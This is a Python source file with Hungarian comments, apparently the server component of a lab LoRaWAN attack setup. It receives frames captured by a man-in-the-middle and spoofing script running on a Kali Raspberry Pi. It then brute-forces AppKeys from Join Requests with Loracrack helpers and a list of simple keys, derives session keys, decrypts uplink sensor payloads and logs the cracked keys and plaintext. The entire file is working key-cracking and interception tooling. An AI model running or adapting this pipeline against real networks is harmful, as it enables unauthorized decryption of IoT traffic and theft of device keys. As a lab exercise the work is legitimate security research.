# saját: decode_sensor_data.py
from decode_sensor_data import decode_e5mini_payload
# saját: analyze_traffic_ver04_final.py
from analyze_traffic_ver04_final import clear_screen, get_lorawan_message_type, decode_data, decrypt_data, genkeys, get_appkey
# saját: server.py
import server
from datetime import datetime
import json
import os
import base64
import subprocess
import threading
import queue
import time

# Loracrack elérési útvonala
loracrack_base_path = "/home/kali/Loracrack"
# Egyszerű appkey-eket tartalmazó fájl
simple_keys = f"{loracrack_base_path}/guessjoin_genkeys/simplekeys"
# Queue az üzeneteknek
messages_queue = queue.Queue()
# output fájlokhoz az aktuális dátum
today = datetime.today().strftime("%Y%m%d")
# dictionary a különböző üzenettípusok tárolására
lorawan_types = {
    "Join Request": [],
    "Join Accept" : [],
    "Unconfirmed Data Up" : [],
    "Unconfirmed Data Down" : [],
    "Confirmed Data Up" : [],
    "Confirmed Data Down" : [],
    "Proprietary" : [],
    "Unknown": []
}

# különböző listák a kinyert kulcsoknak és az esetleges megfejtett üzeneteknek
appkeys = []
appSkeys = []
nwkSkeys = []
decrypted_messages = []
valid_keys = []
timestamps = []

def main():
    """
    A program fő eljárása, mely a különböző szálon futó eljárásokat indítja el.
    """
    comm = threading.Thread(target=server_thread)
    other_watch = threading.Thread(target=watchlist_thread)
    crack = threading.Thread(target=cracking_thread)

    comm.start()
    other_watch.start()
    crack.start()

    comm.join()
    other_watch.join()
    crack.join()

def watchlist_thread():
    """
    Ez az eljárás írja ki a konzolra, hogy eddig milyen üzeneteket kapott el a program és
    milyen kulcsokat sikerült esetleg kinyerni, illetve Uplink üzenetből feltörni.
    5 másodpercenként frissíti a képernyőt.
    """
    while True:
        clear_screen()
        print(f'Join Request: {lorawan_types.get("Join Request")}')
        print(f'Join Accept: {lorawan_types.get("Join Accept")}')
        print(f'Unconfirmed Data Up: {lorawan_types.get("Unconfirmed Data Up")}')
        print(f'Unconfirmed Data Down: {lorawan_types.get("Unconfirmed Data Down")}')
        print(f'Confirmed Data Up: {lorawan_types.get("Confirmed Data Up")}')
        print(f'Confirmed Data Down: {lorawan_types.get("Confirmed Data Down")}')
        print(f'Unknown: {lorawan_types.get("Unknown")}')
        print(f'Proprietary: {lorawan_types.get("Proprietary")}')
        print(f'Appkeys: {appkeys}')
        print(f'AppSkeys: {appSkeys}')
        print(f'Valid keys: {valid_keys}')
        print(f'Decrypted messages: {decrypted_messages}')
        print(f'Timestamps: {timestamps}')
        with open(f"{today}_teszt_run.json", "w") as j:
            mydict = {
                "lorawan_types" : lorawan_types,
                "appkeys" : appkeys,
                "appSkeys" : appSkeys,
                "valid_keys" : valid_keys,
                "decrypted_messages" : decrypted_messages,
                "timestamps" : timestamps
            }
            json.dump(mydict, j, indent=2)
        time.sleep(5)

def server_thread():
    """
    A szervert működtető eljárás. Ehhez kapcsolódik hozzá a MiTM és Spoofing támadást végrehajtó szkript
    a labor hálózatban lévő Kali Linux-os Raspberry Pi-ről.
    A kliens oldali szkript továbbküldi a már részelegesen feldolgozott
    LoRaWAN frame-eket tartalmazó payload-okat, amiket ez az eljárás
    a message queue-ba rak további feldolgozásra.
    """
    
    # bejövő kapcsolódás a klienstől
    server_socket, client = server.connection("10.8.0.6", 1337)

    client_socket, client_address = client
    client_socket.send("[*] Connected.".encode())
    # végtelen ciklus a kommunikációhoz
    while True:
        try:
            # adat fogadása
            data = client_socket.recv(2048)
            new_data = "[+] Data received.".encode()
            if not data:
                continue
            if (b'data' in data):
                # string-é alakítás
                mystr = data.decode()
                # megfelelő base64 rész kinyerése
                base64_string = mystr.split(":")[1].replace('"', '')
                # LoRaWAN üzenettípus és a nyers verzió kiszedése
                msg_type = get_lorawan_message_type(base64_string)
                # base64 dekódolása hexa formába
                hex_data = decode_data(base64_string)
                # amennyiben még nem lett elmentve, akkor mentésre kerül
                if hex_data not in lorawan_types[msg_type]:
                    lorawan_types[msg_type].append(hex_data)
            # válasz küldése a kliensnek
            client_socket.send(new_data)
        except Exception as e:
            print(f"[!] Error: {e}")    

def cracking_thread():
    """
    Eljárás mely azt figyeli, hogy a megfelelő LoRaWAN frame-ek beérkeztek-e a kulcsok kinyeréséhez.
    Amennyiben igen, úgy meghívja a megfelelő Loracrack modulokat a kulcskinyeréshez
    és üzenet feltöréshez.
    """
    # végtelen ciklus
    while True:
        # listák a tesztelésekhez
        join_requests = lorawan_types["Join Request"]
        join_accepts = lorawan_types["Join Accept"]
        unconf_up = lorawan_types["Unconfirmed Data Up"]
        conf_up = lorawan_types["Confirmed Data Up"]
        # ha már legalább egy join request frame érkezett,
        # megpróbálja kinyerni az AppKey-t
        if len(join_requests) > 0:
            for jr in join_requests:
                appkey = get_appkey(jr)
                if appkey != None and appkey not in appkeys:
                    appkeys.append(appkey)
        # ha már van AppKey és legalább egy Join Request és egy Join Accept,
        # akkor megpróbál AppSKey-t és NwkSKey-t generálni
        if len(appkeys) > 0 and len(join_requests) > 0 and len(join_accepts) > 0:
            for ak in appkeys:
                for jr in join_requests:
                    for ja in join_accepts:
                        nwkSkey, appSkey = genkeys(ak, jr, ja)
                        if appSkey not in appSkeys and appSkey != None:
                            appSkeys.append(appSkey)
        # ha van Unconfirmed vagy Confirmed Data Up és AppSKey
        # akkor megpróbálja feltörni az üzeneteket
        if len(unconf_up) > 0 and len(appSkeys) > 0:
            crack_data(f'{today}_cracked.txt', unconf_up)
        if len(conf_up) > 0 and len(appSkeys) > 0:
            crack_data(f'{today}_cracked.txt', conf_up)

def crack_data(output_file: str, uplink_hex: list):
    """
    Eljárás, mely az üzenetek feltörését próbálja meg,
    majd ha az sikeres, akkor fájlba írja az eredményt
    időbélyeggel ellátva.

    Bemenet:
        output_file (str): fájl, ahova az eredményt írja
        uplink_hex (list): az uplink üzeneteket tartalmazó lista
    """
    with open(output_file, "a") as out:
        for key in appSkeys:
            for d in uplink_hex:
                dec = decrypt_data(key, d)
                if dec != None:
                    try:
                        msg = decode_e5mini_payload(dec)
                    except Exception as e:
                        continue
                    if msg not in decrypted_messages:
                        timestamp = datetime.today().strftime("%Y-%m-%d %H:%M:%S")
                        timestamps.append(timestamp)
                        decrypted_messages.append(msg)
                        valid_keys.append(key)
                        print(f"Valid key: {key}")
                        print(f"Decrypted data: {msg}")
                        out.write(f'{timestamp}\n\tValid key: {key}\n\tSensor data:\n\t{msg}\n{50*"#"}\n')
                        out.flush()

if __name__ == "__main__":
    main()